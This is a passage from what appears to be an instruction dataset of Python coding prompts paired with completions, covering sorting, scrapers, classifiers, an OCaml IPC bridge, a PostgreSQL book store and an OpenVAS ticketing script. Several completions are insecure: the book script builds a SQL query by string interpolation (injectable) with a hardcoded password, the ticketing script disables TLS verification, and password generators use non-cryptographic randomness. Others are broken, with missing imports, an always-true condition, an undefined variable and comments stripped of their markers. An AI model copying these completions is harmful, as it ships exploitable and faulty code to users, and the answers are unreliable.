argCount def indexOf(searchElement): array = this.to_object() arr_len = array.get('length').to_uint32() if arr_len == 0: return -1 if len(arguments)>1: n = arguments[1].to_int() else: n = 0 if n >= arr_len: return -1 if n >= 0: k = n else: k = arr_len - abs(n) if k < 0: k = 0 while k < arr_len: if array.has_property(str(k)): elementK = array.get(str(k)) if searchElement.strict_equality_comparison(elementK): return k k += 1 return -1 def lastIndexOf(searchElement): array = this.to_object() arr_len = array.get('length').to_uint32() if arr_len == 0: return -1 if len(arguments)>1: n = arguments[1].to_int() else: n = arr_len - 1 if n >= 0: k = min(n, arr_len-1) else: k = arr_len - abs(n) while k >= 0: if array.has_property(str(k)): elementK = array.get(str(k)) if searchElement.strict_equality_comparison(elementK): return k k -= 1 return -1 def every(callbackfn): array = this.to_object() arr_len = array.get('length').to_uint32() if not callbackfn.is_callable(): raise this.MakeError('TypeError', 'callbackfn must be a function') T = arguments[1] k = 0 while k<arr_len: if array.has_property(str(k)): kValue = array.get(str(k)) if not callbackfn.call(T, (kValue, this.Js(k), array)).to_boolean().value: return False k += 1 return True def some(callbackfn): array = this.to_object() arr_len = array.get('length').to_uint32() if not callbackfn.is_callable(): raise this.MakeError('TypeError', 'callbackfn must be a function') T = arguments[1] k = 0 while k<arr_len: if array.has_property(str(k)): kValue = array.get(str(k)) if callbackfn.call(T, (kValue, this.Js(k), array)).to_boolean().value: return True k += 1 return False def forEach(callbackfn): array = this.to_object() arr_len = array.get('length').to_uint32() if not callbackfn.is_callable(): raise this.MakeError('TypeError', 'callbackfn must be a function') T = arguments[1] k = 0 while k<arr_len: if array.has_property(str(k)): kValue = array.get(str(k)) callbackfn.call(T, (kValue, this.Js(k), array)) k+=1 def map(callbackfn): array = this.to_object() arr_len = array.get('length').to_uint32() if not callbackfn.is_callable(): raise this.MakeError('TypeError', 'callbackfn must be a function') T = arguments[1] A = this.Js([]) k = 0 while k<arr_len: Pk = str(k) if array.has_property(Pk): kValue = array.get(Pk) mappedValue = callbackfn.call(T, (kValue, this.Js(k), array)) A.define_own_property(Pk, {'value': mappedValue, 'writable': True, 'enumerable': True, 'configurable': True}) k += 1 return A def filter(callbackfn): array = this.to_object() arr_len = array.get('length').to_uint32() if not callbackfn.is_callable(): raise this.MakeError('TypeError', 'callbackfn must be a function') T = arguments[1] res = [] k = 0 while k<arr_len: if array.has_property(str(k)): kValue = array.get(str(k)) if callbackfn.call(T, (kValue, this.Js(k), array)).to_boolean().value: res.append(kValue) k += 1 return res # converted to js array automatically def reduce(callbackfn): array = this.to_object() arr_len = array.get('length').to_uint32() if not callbackfn.is_callable(): raise this.MakeError('TypeError', 'callbackfn must be a function') if not arr_len and len(arguments)<2: raise this.MakeError('TypeError', 'Reduce of empty array with no initial value') k = 0 if len(arguments)>1: # initial value present accumulator = arguments[1] else: kPresent = False while not kPresent and k<arr_len: kPresent = array.has_property(str(k)) if kPresent: accumulator = array.get(str(k)) k += 1 if not kPresent: raise this.MakeError('TypeError', 'Reduce of empty array with no initial value') while k<arr_len: if array.has_property(str(k)): kValue = array.get(str(k)) accumulator = callbackfn.call(this.undefined, (accumulator, kValue, this.Js(k), array)) k += 1 return accumulator def reduceRight(callbackfn): array = this.to_object() arr_len = array.get('length').to_uint32() if not callbackfn.is_callable(): raise this.MakeError('TypeError', 'callbackfn must be a function') if not arr_len and len(arguments)<2: raise this.MakeError('TypeError', 'Reduce of empty array with no initial value') k = arr_len - 1 if len(arguments)>1: # initial value present accumulator = arguments[1] else: kPresent = False while not kPresent and k>=0: kPresent = array.has_property(str(k)) if kPresent: accumulator = array.get(str(k)) k -= 1 if not kPresent: raise this.MakeError('TypeError', 'Reduce of empty array with no initial value') while k>=0: if array.has_property(str(k)): kValue = array.get(str(k)) accumulator = callbackfn.call(this.undefined, (accumulator, kValue, this.Js(k), array)) k -= 1 return accumulator def sort_compare(a, b, comp): if a is None: if b is None: return 0 return 1 if b is None: if a is None: return 0 return -1 if a.is_undefined(): if b.is_undefined(): return 0 return 1 if b.is_undefined(): if a.is_undefined(): return 0 return -1 if comp is not None: res = comp.call(a.undefined, (a, b)) return res.to_int() x, y = a.to_string(), b.to_string() if x<y: return -1 elif x>y: return 1 return 0"},{"prompt":"Generate a secure random 24byte string in Python. Not applicable","completion":"import secrets # Generate the random string random_string = secrets.token_hex(24) print(random_string)"},{"prompt":"Build a series of steps to implement a Bubble Sort algorithm in Python.","completion":"# Steps to implement Bubble Sort Algorithm: # 1. Loop through the list with two indices, the current element and the NEXT element # 2. Compare current element with the NEXT element # 3. If current element is greater than NEXT element, swap them # 4. Repeat this till the list is sorted def bubble_sort(list): # Traverse through all elements of list for i in range(0, len(list)-1): for j in range(0, len(list)-i-1): if list[j] > list[j+1]: list[j], list[j+1] = list[j+1], list[j]"},{"prompt":"Develop a web scraping program in Python that takes a website's URL as input and extracts its meta tags. Input: URL: http://www.example.com","completion":"import requests from bs4 import BeautifulSoup # Get the URL url = \\"http://www.example.com\\" # Get the HTML from the URL r = requests.get(url) html = r.text # Parse the HTML soup = BeautifulSoup(html, 'html.parser') # Get the meta tags metaTags = soup.find_all('meta') # Print out the meta tags for metaTag in metaTags: print \\"Name: %s Content: %s\\" % (metaTag.get('name'), metaTag.get('content'))"},{"prompt":"Generate a function in Python that will take a username and password as parameters and authenticate the user.","completion":"def authenticate(username, password): \\"\\"\\"Authenticate a user with username and password\\"\\"\\" # Your authentication implementation return is_authenticated # true or false"},{"prompt":"Rearrange the following code so that it works in Python. y, x = x, y","completion":"x, y = y, x"},{"prompt":"Suggest an alternative solution to the problem of identifying duplicate items in Python.","completion":"One alternative solution to the problem of identifying duplicate items in Python is to use a set to store the items. A set data structure only allows unique elements and so any duplicate items will be automatically discarded when added to the set. Thus, iterating through a list of items and adding them to a set will result in a set without any duplicate elements."},{"prompt":"Write a Python program for computing the sum of a given array of integers. [1, 2, 3, 4, 5]","completion":"def compute_sum(int_arry): sum = 0 # loop through each element in the array for i in int_arry: sum += i return sum # example testing code int_arry = [1, 2, 3, 4, 5] total_sum = compute_sum(int_arry) print(\\"Sum of array elements is\\", total_sum)"},{"prompt":"Create a Python program that prints Hello World! 10 times.","completion":"for i in range(10): print(\\"Hello World!\\")"},{"prompt":"Use Python to generate a program that takes a list of integers as input and prints out their factors. [24, 75]","completion":"def print_factors(numbers): for n in numbers: print(\\"Factors of {}:\\".format(n)) for i in range(1, n + 1): if n % i == 0: print(i) print_factors([24, 75])"},{"prompt":"Build a web scraper using Python that extracts data from Google search Keywords: Best budget laptop","completion":"# import libraries import requests from bs4 import BeautifulSoup # url url = 'https://www.google.com/search?q=best+budget+laptop' # get page using requests page = requests.get(url) # parse using BeautifulSoup soup = BeautifulSoup(page.content, 'html.parser') # get all links from result page results = soup.select('.r a') # iterate over each link for item in results: result_url = item.get('href') # get the required data print(result_url)"},{"prompt":"Write a code to generate a UUID using Python","completion":"import uuid def generate_uuid(): return str(uuid.uuid4()) if __name__ == '__main__': print(generate_uuid())"},{"prompt":"Create a priority queue with a custom max function in Python.","completion":"class PriorityQueue(object): def __init__(self): self.queue = [] def __str__(self): return ' '.join([str(i) for i in self.queue]) # for checking if the queue is empty def isEmpty(self): return len(self.queue) == 0 # for inserting an element in the queue def insert(self, data): self.queue.append(data) # for popping an element based on custom max function def max_pop(self, max_func): max_val = self.queue[0] max_index = 0 for i in range(len(self.queue)): if max_func(max_val, self.queue[i]) == self.queue[i]: max_val = self.queue[i] max_index = i del self.queue[max_index] return max_val"},{"prompt":"Create a Python program to check if a number is an Armstrong number. number = 153","completion":"def isArmstrong(number): num = number length = len(str(number)) sum_of_the_power_of_digits = 0 while num > 0: rem = num % 10 sum_of_the_power_of_digits = sum_of_the_power_of_digits + np.power(rem, length) num //= 10 if (sum_of_the_power_of_digits == number) : return True else : return False"},{"prompt":"Create a Python program to classify a given text into one of two categories using a multinomial Naive Bayes classifier. Data.csv category, text positive, I had a great time! negative, This was a horrible experience.","completion":"import pandas as pd from sklearn.feature_extraction.text import CountVectorizer from sklearn.naive_bayes import MultinomialNB # Load the data from a file df = pd.read_csv('Data.csv') # Extract the labels and text from the data labels = df['category'] texts = df['text'] # Create a count vectorizer vectorizer = CountVectorizer() vectors = vectorizer.fit_transform(texts) # Create a multinomial Naive Bayes classifier classifier = MultinomialNB() classifier.fit(vectors, labels) # Test the classifier with some input input_text = \\"It wasn't the best night.\\" input_vector = vectorizer.transform([input_text]) predicted_label = classifier.predict(input_vector)[0] print('Input text:', input_text) print('Predicted label:', predicted_label)"},{"prompt":"Write a Python program to convert an infix expression to a postfix expression. A * B + C","completion":"# Python program to convert # infix expression to postfix # Class to convert the expression class Conversion: # Constructor to initialize the class variables def __init__(self, capacity): self.top = -1 self.capacity = capacity # This array is used a stack self.array = [] # Precedence setting self.output = [] self.precedence = {'+':1, '-':1, '*':2, '/':2, '^':3} # check if the stack is empty def isEmpty(self): return True if self.top == -1 else False # Return the value of the top of the stack def peek(self): return self.array[-1] # Pop the element from the stack def pop(self): if not self.isEmpty(): self.top -= 1 return self.array.pop() else: return \\"\\" # Push the element to the stack def push(self, op): self.top += 1 self.array.append(op) # A utility function to check is the given character # is operand def isOperand(self, ch): return ch.isalpha() # Check if the precedence of operator is strictly # less than top of stack or not def notGreater(self, i): try: a = self.precedence[i] b = self.precedence[self.peek()] return True if a <= b else False except KeyError: return False # The main function that converts given infix expression # to postfix expression def infixToPostfix(self, exp): # Iterate over the expression for conversion for i in exp: # If the character is an operand, # add it to output if self.isOperand(i): self.output.append(i) # If the character is an '(', push it to stack elif i == '(': self.push(i) # If the scanned character is an ')', pop and # output from the stack until and '(' is found elif i == ')': while( (not self.isEmpty()) and self.peek() != '('): a = self.pop() self.output.append(a) if (not self.isEmpty() and self.peek() != '('): return -1 else: self.pop() # An operator is encountered else: while(not self.isEmpty() and self.notGreater(i)): self.output.append(self.pop()) self.push(i) # pop all the operator from the stack while not self.isEmpty(): self.output.append(self.pop()) print(\\"\\".join(self.output) ) exp = \\"A * B + C\\" obj = Conversion(len(exp)) obj.infixToPostfix(exp) # Output: AB*C+"},{"prompt":"Convert the following Java program to Python. public class HelloWorld { public static void main(String[] args) { System.out.println(Hello, World!); } }","completion":"# Program to print \\"Hello, World!\\" print(\\"Hello, World!\\")"},{"prompt":"mplement a function in Python that takes a number n and generates a random list of integers between 0 and n. n = 10","completion":"import random def randomList(n): list = [] for i in range(n): list.append(random.randint(0, n)) return list print(randomList(10))"},{"prompt":"Create a python program that calculates the maximum of three numbers. Numbers: 5, 8, 3","completion":"def max_three(a, b, c): m = max(a, b) m = max(m, c) return m"},{"prompt":"Model a function in Python that swaps the values of two variables without using a third one. x = 10 y = 20","completion":"def swap(x, y): x, y = y, x return x, y x, y = swap(x, y) print('x =', x) print('y =', y)"},{"prompt":"Generate a Python program which determines if a given number is divisible by 7 28","completion":"def is_divisible_by_7(num): if num % 7 == 0: return True else: return False result = is_divisible_by_7(28) print(result)"},{"prompt":"Write a Python code to generate a random password string of length 8, consisting of upper and lower case characters, special characters and digits.","completion":"import random import string def generate_password_string(length): # Generate a random password string of length 8, consisting of upper and lower case characters, special characters and digits password_characters = string.ascii_letters + string.digits + string.punctuation return ''.join(random.choice(password_characters) for i in range(length)) if __name__ == '__main__': print(generate_password_string(8))"},{"prompt":"Edit an existing Python program that takes two numbers as input and calculates their sum. The edited program should accept the numbers as input from the user via the command line. Not applicable","completion":"# Capture two numbers from the command line num1 = int(input(\\"Please enter a number: \\")) num2 = int(input(\\"Please enter a second number: \\")) # Calculate the sum sum = num1 + num2 # Print the result print(\\"The sum of the numbers is:\\", sum)"},{"prompt":"Create a Python class for a basic calculator with an add and subtract function. Not applicable","completion":"class Calculator: def __init__(self): self.values = [] def add(self, x, y): self.values.append(x + y) def subtract(self, x, y): self.values.append(x - y) calc = Calculator() calc.add(2, 3) calc.subtract(3, 4) print(calc.values[-1])"},{"prompt":"Develop a Python program that takes a text string as input and displays only those words which contain the letter ‘a’. This is an example of a string to test.","completion":"input_text = 'This is an example of a string to test.' words = input_text.split() for word in words: if 'a' in word: print(word) # Output: an example a string test."},{"prompt":"mprove the following code in Python to find the product of two given numbers without using the multiply operator. def multiply(x, y): result = 0 for i in range(x): result += y return resul","completion":"def multiply(x, y): result = 0 for i in range(y): result += x return result def power(x, y): result = 1 for i in range(y): result *= x return result"},{"prompt":"Create an algorithm in Python to sort a given array using Heap sort.","completion":"def heapSort(arr): n = len(arr) # Build heap (rearrange array) for i in range(n//2 - 1, -1, -1): heapify(arr, n, i) # One by one extract an element from heap for i in range(n-1, 0, -1): arr[0], arr[i] = arr[i], arr[0] # swap heapify(arr, i, 0) # To heapify subtree rooted at index i def heapify(arr, n, i): largest = i # Initialize largest as root l = 2 * i + 1 r = 2 * i + 2 # See if left child of root exists and is # greater than root if l < n and arr[i] < arr[l]: largest = l # See if right child of root exists and is # greater than root if r < n and arr[largest] < arr[r]: largest = r # Change root, if needed if largest != i: arr[i],arr[largest] = arr[largest],arr[i] # Heapify the root. heapify(arr, n, largest)"},{"prompt":"Given a binary tree, you need to write a Python program to print out all the nodes at each level.","completion":"def print_level_order(root): if root is None: return queue = [] queue.append(root) while(len(queue) > 0): print(queue[0].data, end=\\" \\") node = queue.pop(0) if node.left is not None: queue.append(node.left) if node.right is not None: queue.append(node.right)"},{"prompt":"Create a basic chatbot in Python that takes input from the user and responds. Not applicable","completion":"import random def chatbot(): prompt = \\"> \\" response = \\"\\" while response != \\"goodbye\\": response = input(prompt) if response == \\"hello\\": print(\\"Hi there!\\") elif response == \\"how are you?\\": responses = [\\"I'm good!\\", \\"I'm doing alright!\\", \\"Not too bad!\\"] print(random.choice(responses)) chatbot() // Output: Hi there!"},{"prompt":"Create a machine learning algorithm in Python to classify flowers by their petal size.","completion":"from sklearn.svm import SVC from sklearn.datasets import load_iris # Load the iris dataset iris = load_iris() # Create the X (features) and y (target) arrays X = iris.data y = iris.target # Split the dataset into test and train X_train, X_test, y_train, y_test = train_test_split(X, y, test_size = 0.2, random_state = 0) # Train the SVC classifier svm_model_linear = SVC(kernel = 'linear', C = 1).fit(X_train, y_train) # Create predictions predictions = svm_model_linear.predict(X_test)"},{"prompt":"Create a binary search program in Python to find a given number in a given array. Array: [0, 1, 2, 3, 4, 5, 6, 7, 8, 9] Number: 4","completion":"def binary_search(arr, num): \\"\\"\\" Function to use binary search to find a given number in a given array. Arguments: arr -- input array num -- number to be found Returns: res -- boolean value \\"\\"\\" # Initialize boolean variable res = False # Find the mid-point of the array mid = int(len(arr)/2) # initialize the beginning and end of the array start = 0 end = len(arr) - 1 # If the number is in the array, set boolean as True if num == arr[mid]: res = True # If the number is less than the mid-point of the array, # make the end of the array the mid-point - 1 elif num < arr[mid]: end = mid - 1 # Else, make the start of the array the mid-point + 1 else: start = mid + 1 # If the start and the end of the array have not met each other, # make a recursive call to the binary search function if start <= end: return binary_search(arr[start:end+1], num) return res"},{"prompt":"Write a function in Python that takes in a linked list and a value, and checks to see if the value is contained within the list. Head > 4 > 8 > 15 > 16 > 23 > 42 > null Value: 15","completion":"def contains(head, value): current = head while current is not None: if current.data == value: return True current = current.next return False head = Node(4) head.next = Node(8) head.next.next = Node(15) head.next.next.next = Node(16) head.next.next.next.next = Node(23) head.next.next.next.next.next = Node(42) val = 15 print(contains(head, val)) # Output : True"},{"prompt":"Generate an algorithm in Python to swap two numbers without using a third variable a = 6, b = 10","completion":"def swap_two_numbers(a, b): a = a + b b = a - b a = a - b return a, b a = 6 b = 10 print(\\"The value of a is %d and b is %d\\" %(a, b)) a,b = swap_two_numbers(a,b) print(\\"The value of a is %d and b is %d\\" %(a, b))"},{"prompt":"Write a Python program that would take a string and return the length of its longest word.","completion":"def longest_word_length(string): words = string.split(' ') max_length = 0 for word in words: if len(word) > max_length: max_length = len(word) return max_length"},{"prompt":"Create a Python script for matrix multiplication. The script should perform multiplication of two given matrices and output the result. Matrix A = [[1, 2], [3, 4]] Matrix B = [[5, 6], [7, 8]]","completion":"def matrix_mul(A, B): res = [[0, 0], [0, 0]] for i in range(len(A)): for j in range(len(B[0])): for k in range(len(B)): res[i][j] += A[i][k] * B[k][j] return res A = [[1, 2], [3, 4]] B = [[5, 6], [7, 8]] res = matrix_mul(A, B) print(res) # Output # [[19, 22], [43, 50]]"},{"prompt":"Create a Python script that sets up a communication class and an execution handler to receive and execute instructions from an OCaml process. The script should include methods to convert integers to 8byte signed integers, convert Python objects to BSON format, and resolve arguments passed to methods. The script should also handle exceptions and send return values back to the OCaml process. Finally, the script should accept command line arguments for the working directory, read pipe path, and write pipe path.","completion":"from time import time from struct import pack, unpack import bson, sys, os, codecs from random import randint from traceback import print_exc def int_to_int64_bytes(i): return pack('>q', i) def py_to_bson(val): if type(val) is int: return bson.int64.Int64(val) if sys.version_info.major == 2 and type(val) is str: return bson.binary.Binary(val) return val def exit_lymp(): # closing 'python_log' sys.stdout.close() exit(0) # A communication class, could be implemented using other ipc methods, # it only needs the methods 'send_bytes' and 'get_bytes' class PipeReaderWriter: def __init__(self, read_pipe_name, write_pipe_name): self.get_pipes(read_pipe_name, write_pipe_name) def get_pipes(self, read_pipe_name, write_pipe_name): # Order of open matters, since it is blocking, should match OCaml order # 0 to be unbuffered, so we don't have to flush (better performance ?) self.write_pipe = open(write_pipe_name, 'wb', 0) self.read_pipe = open(read_pipe_name, 'rb', 0) def send_bytes(self, byts): # '>q' to force signed 8 bytes integer self.write_pipe.write(pack('>q', len(byts))) #self.write_pipe.flush() self.write_pipe.write(byts) #self.write_pipe.flush() def get_bytes(self): # '>q' to force signed 8 bytes integer try: nb_bytes = unpack('>q', self.read_pipe.read(8))[0] except: # ocaml process has been terminated exit_lymp() byts = b'' if sys.version_info.major == 3 else \\"\\" while len(byts) < nb_bytes: byts += self.read_pipe.read(nb_bytes) return byts class ExecutionHandler: to_ret_types = { int: \\"i\\", tuple: \\"t\\", list: \\"l\\", str: \\"s\\", float: \\"f\\", type(None): \\"n\\", bool: \\"b\\", bytes: \\"B\\" } # for python 2, unicode is str and str is bytes if sys.version_info.major == 2: to_ret_types[unicode] = \\"s\\" to_ret_types[str] = \\"B\\" def __init__(self, reader_writer): self.reader_writer = reader_writer self.modules = {} self.objs = {} self.ref_nb = 0 def loop(self): # don't recursively call .loop, to avoid stack overflow while True: command_bytes = self.reader_writer.get_bytes() if command_bytes == b'done': exit_lymp() instruction = bson.BSON.decode(bson.BSON(command_bytes)) try: ret = self.execute_instruction(instruction) # data may still be in the buffer sys.stdout.flush() self.send_ret(ret, ret_ref=(\\"R\\" in instruction)) except BaseException as e: # exception whilst executing, inform ocaml side print_exc() # data may still be in the buffer sys.stdout.flush() self.send_ret(\\"\\", exception=True) def ret_to_msg(self, ret, ret_ref): msg = {} # reference (type not supported or explicitely asked to) if ret_ref or (type(ret) not in self.to_ret_types): self.ref_nb += 1 self.objs[self.ref_nb] = ret msg[\\"t\\"] = \\"r\\" msg[\\"v\\"] = bson.code.Code(str(self.ref_nb)) else: msg[\\"t\\"] = self.to_ret_types[type(ret)] # tuples are just like lists, but their type \\"t\\" is \\"t\\" instead of \\"l\\" if type(ret) is tuple: ret = list(ret) # if type is list, further resolve if type(ret) is list: msg[\\"v\\"] = [] for elt in ret: # ret_ref is false here (would not be in the else otherwise) msg[\\"v\\"].append(self.ret_to_msg(elt, False)) else: msg[\\"v\\"] = py_to_bson(ret) return msg def send_ret(self, ret, exception=False, ret_ref=False): if exception: msg = {} msg[\\"t\\"] = \\"e\\" msg[\\"v\\"] = \\"\\" else: msg = self.ret_to_msg(ret, ret_ref) msg = bytes(bson.BSON.encode(msg)) self.reader_writer.send_bytes(msg) def resolve_args(self, args): named = {} i = 0 for arg in args: # resolve named args (list of size 2, first one being a bson.code.Code starting with \\"!\\") if type(arg) is list and len(arg) == 2 and type(arg[0]) is bson.code.Code and str(arg[0])[0] == \\"!\\": named[str(arg[0])[1:]] = self.resolve_args([arg[1]])[0][0] del args[i] continue # if bytes if type(arg) is bson.binary.Binary: args[i] = bytes(arg) # resolve reference args (using bson jscode) if type(arg) is bson.code.Code: args[i] = self.objs[int(arg)] if type(arg) is bson.int64.Int64: args[i] = int(arg) # for python 2, if arg is str, convert to unicode if sys.version_info.major == 2 and type(arg) is str: args[i] = args[i].decode('utf-8') # for python 2, if arg is bytes, convert to str if sys.version_info.major == 2 and type(arg) is bson.binary.Binary: args[i] = str(arg) # if we have a list, we must recursively resolve if type(arg) is list: args[i] = self.resolve_args(arg)[0] # if we have a dict, it is a tuple inside \\"v\\" if type(arg) is dict: args[i] = tuple(self.resolve_args(arg[\\"v\\"])[0]) i += 1 return args, named def execute_instruction(self, instruction): if \\"r\\" in instruction: # if we are asked to realease an inexisting of already released reference if \\"d\\" in instruction and instruction[\\"r\\"] not in self.objs: return None # module is the object referenced, later we call getattr to get the method called module = self.objs[instruction[\\"r\\"]] # if we were asked to 'detach' (release) the reference if \\"d\\" in instruction: del self.objs[instruction[\\"r\\"]] return None # if we were asked to return the reference if \\"g\\" in instruction: return module else: # python 2 builtin module has a different name if sys.version_info.major == 2 and instruction[\\"m\\"] == \\"builtins\\": instruction[\\"m\\"] = \\"__builtin__\\" if instruction[\\"m\\"] not in self.modules: __import__(instruction[\\"m\\"]) self.modules[instruction[\\"m\\"]] = sys.modules[instruction[\\"m\\"]] module = self.modules[instruction[\\"m\\"]] # set attribute if \\"s\\" in instruction: args, named = self.resolve_args(instruction[\\"a\\"]) arg = args[0] setattr(module, instruction[\\"f\\"], arg) return None func_or_attr = getattr(module, instruction[\\"f\\"]) # get attribute if \\"t\\" in instruction: return func_or_attr args = instruction[\\"a\\"] args, named = self.resolve_args(args) ret = func_or_attr(*args, **named) return ret working_directory = sys.argv[1] write_pipe_path = sys.argv[2] read_pipe_path = sys.argv[3] # changing dir os.chdir(working_directory) sys.path.insert(0, working_directory) # redirect stdout to 'python_log' sys.stdout = codecs.open('python_log', 'w', encoding='utf-8') sys.stderr = sys.stdout communication = PipeReaderWriter(read_pipe_path, write_pipe_path) handler = ExecutionHandler(communication) handler.loop()"},{"prompt":"Create a Python program to generate random passwords with given constraints? Password length must be between 8 to 12 character","completion":"import string import random def generate_password(password_length): chars = string.ascii_letters + string.digits + string.punctuation password_list = random.sample(list(chars), password_length) password = \\"\\".join(password_list) return password if __name__ == \\"__main__\\": pwd_length = random.randint(8, 12) new_password = generate_password(pwd_length) print(new_password)"},{"prompt":"Create a PostgreSQL database and Python script to store and retrieve books. The database should include a table for books (with fields for title and author), and the script should have functions to add a new book, view all books, and view a specific book. Not applicable","completion":"import psycopg2 import sys try: conn = psycopg2.connect(\\"dbname = 'books' user = 'postgres' host = 'localhost' password = 'password'\\") except psycopg2.Error as e: print e try: cur = conn.cursor() except psycopg2.Error as e: print e def createTable(): query = \\"CREATE TABLE books(title text, author text);\\" try: cur.execute(query) except psycopg2.Error as e: print e def addBook(title, author): query = \\"INSERT INTO books (title, author) VALUES (%s, %s);\\" try: cur.execute(query, (title, author)) conn.commit() except psycopg2.Error as e: print e def viewBooks(): query = \\"SELECT * FROM books;\\" try: cur.execute(query) results = cur.fetchall() print results except psycopg2.Error as e: print e def viewBook(title): query = \\"SELECT * FROM books WHERE title = '%s';\\" % title try: cur.execute(query) results = cur.fetchone() print results except psycopg2.Error as e: print e if __name__ == \\"__main__\\": createTable() addBook(\\"The Catcher in the Rye\\", \\"J.D. Salinger\\") viewBooks() viewBook(\\"The Catcher in the Rye\\")"},{"prompt":"Create a naive Bayes classifier model in Python.","completion":"from sklearn.naive_bayes import GaussianNB # Create Gaussian Naive Bayes classifier with built-in datasets gnb = GaussianNB() # Train the model using the training sets gnb.fit(X_train, y_train) # Predict the output using the test set y_pred = gnb.predict(X_test)"},{"prompt":"Generate an array of unique random numbers in Python.","completion":"import random def random_array(arr_length): rnd_arr = [] for i in range(arr_length): rnd_num = random.randint(0, arr_length) # picking random number while rnd_num in rnd_arr: # checking if not already in array rnd_num = random.randint(0, arr_length) rnd_arr.append(rnd_num) return rnd_arr arr_length = 10 random_array(arr_length)"},{"prompt":"Create a Python program to find all possible combinations of words that can be formed with a set of characters. characters = ['a', 'b', 'c', 'd']","completion":"def find_combinations(chars): \\"\\"\\"Find all possible combinations of words that can be formed with a set of characters\\"\\"\\" characters = list(chars) # Convert the characters into a list combinations = set() # Create an empty set to store the combinations # Iterate over the list of characters for i in range(len(characters)): # Get the current character char = characters[i] # Create a new list with the other remaining characters remaining_chars = characters[:i] + characters[i+1:] # Create a temporary set to store all the combinations # of the remaining characters temp_set = set() for c in remaining_chars: temp_set.add(char + c) # Add the temporary set to the main set of combinations combinations = combinations | temp_set return combinations # Test combinations = find_combinations(\\"abcd\\") # Expected output: {'ac', 'bd', 'bc', 'ab', 'cd', 'ad', 'db', 'dc'} print(combinations)"},{"prompt":"Write a Python code to generate a random color code (RGB).","completion":"# Generate a random color code (RGB) import random def get_random_color(): r = random.randint(0, 255) g = random.randint(0, 255) b = random.randint(0, 255) return (r, g, b) if __name__ == '__main__': print(get_random_color())"},{"prompt":"Use python to create a function to calculate the mean of three numbers.","completion":"def mean_of_three(num1, num2, num3): return (num1 + num2 + num3) / 3 if __name__ == '__main__': print(mean_of_three(2, 4, 6))"},{"prompt":"Write a Python program to extract the last two digits of the given array of integers. arr = [30, 2993, 10056]","completion":"res = [] for num in arr: res.append(num%100) print(res) # [30, 93, 56]"},{"prompt":"Create issue tickets on ServiceNow and Redmine systems for tracking purposes using an XML report extracted from an OpenVAS VA scanner. Configure your environment through the preferences file 'ov_prefs.txt' and specify the OpenVAS XML report file on the command line. The script will create a Redmine issue and a ServiceNow incident for each vulnerability in the report file that meets the specified severity level. The script will check for currently active tickets for the same issue and update them if they exist. The script will log the created tickets in 'ticketlog.csv' and 'opentix.csv'.","completion":"#!/usr/bin/python3 # This takes an XML report extracted from an OpenVAS VA scanner and # creates issue tickets on ServiceNow and Redmine systems for tracking # purposes. # # Most parameters are specified in the 'ov_prefs.txt' file, however, # the XML report file may be specified on the command line. If # specified this way, the script will ignore that line in the # preferences file, however, the line must still exist! # version 0.5 #modules import os import sys import csv import json import socket import requests from redmine import Redmine import xml.etree.ElementTree as ET Configure your environment through preferences file # load prefs from ~/.incmgmt/prefs.txt # The parameters should be in the following format # DO NOT use comments or blank lines. # Redmine Project # Redmine URL # Redmine API key # ServiceNow URL # ServiceNow username # Servicenow password # severity level # OpenVAS XML report file # Preamble: general info you want included in every ticket created os.chdir(os.path.expanduser(\\"~\\") + \\"/.incmgmt/\\") prefs = [] for line in open('ov_prefs.txt'): prefs.append(line) redmine_project = prefs[0].rstrip() redmine_server = prefs[1].rstrip() redmine_key = prefs[2].rstrip() sn_server = prefs[3].rstrip() user = prefs[4].rstrip() pwd = prefs[5].rstrip() severity_filter = prefs[6].rstrip() if len(sys.argv) == 1: # test for command line arguments ov_report = prefs[7].rstrip() else: ov_report = sys.argv[1] preamble = prefs[8].rstrip() # Define service now headers headers = {\\"Content-Type\\":\\"application/json\\",\\"Accept\\":\\"application/json\\"} # Input the vulnerability report and parse the XML root = ET.parse(ov_report) determine criticality factors # impact and urgency are used for Service Now # priority is used for Redmine def criticality(cvss): global impact global urgency global priority if float(cvss) > 7: impact = 2 urgency = 1 priority = 5 elif float(cvss) < 4: impact = 3 urgency = 3 priority = 3 else: impact = 2 urgency = 2 priority = 4 return impact, urgency, priority def reverse_lookup(ip): try: hostname = socket.gethostbyaddr(ip)[0] except socket.herror: hostname = \\" \\" return hostname determine category \\"\\"\\" Redmine reference 0 nothing 53 Database 54 Networking 56 Server - Unix 55 Server - Windows 57 Web Application \\"\\"\\" Function to categorize the issue for all ticketing systems # categoy is used for redmine, and subcategory is used for # ServiceNow because it has a default high-level category for vulns def categorize(family): if family == \\"Web application abuses\\" or \\"Web Servers\\": category = 57 subcategory = \\"Internal Application\\" elif family == \\"Databases\\": category = 53 subcategory = \\"Internal Application\\" elif family == \\"General\\": category = 56 subcategory = \\"UNIX\\" elif \\"CentOS\\" in family: category = 56 subcategory = \\"UNIX\\" elif \\"Windows\\" in family: category = 55 subcategory = \\"Windows\\" else: category = 0 subcategory = \\" \\" return category, subcategory #Specify Redmine server params redmine = Redmine(redmine_server, requests={'verify': False}, key=redmine_key, version='2.5.1') def redmine_issue(priority, subject, body, category): Create an issue in Redmine to track the vulnerability # and return information regarding the created ticket new_issue = redmine.issue.create(project_id = redmine_project, priority_id = priority, subject = subject, description = body, tracker_id=19, category_id = category) redmine_issue_id = str(new_issue.id) redmine_url = redmine_server + \\"/issues/\\" + redmine_issue_id print(\\"redmine ticket created\\") return redmine_url, redmine_issue_id def sn_issue(subject, redmine_url, subcategory, impact, urgency): Create the incident in ServiceNow # Construct the incident JSON object incident_data = '{' + '\\"short_description\\":' + '\\"' + subject + '\\",' + '\\"description\\":' + '\\"For more information, see: ' + redmine_url + '\\",' + '\\"u_category\\":' + '\\"Vulnerability Management\\",' + '\\"u_subcategory\\":' + '\\"' + subcategory + '\\",' + '\\"impact\\":' + '\\"' + str(impact) + '\\",' + '\\"urgency\\":' + '\\"' + str(urgency) + '\\",' + '\\"contact_type\\":\\"Alert\\"' + '}' # Create the incident on the Service Now system response = requests.post(sn_server, auth=(user, pwd), headers=headers, data=incident_data) # Capture the ticket number and unique identifier sn_ticket = response.json()['result']['number'] sys_id = response.json()['result']['sys_id'] print(\\"service now ticket created\\") return sn_ticket, sys_id # Update the Service Now ticket with a comment def sn_update(sys_id, comment): sn_url = sn_server + '/' + sys_id # REST URL for the ticket update = requests.patch(sn_url, auth=(user, pwd), headers=headers, data='{\\"comments\\":\\"' + comment +'\\"}') if update.status_code != 200: print('Status:', response.status_code, 'Headers:', response.headers, 'Error Response:',response.json()) exit() print(\\"Updated Service Now ticket\\" + \\" \\" + sys_id) # user 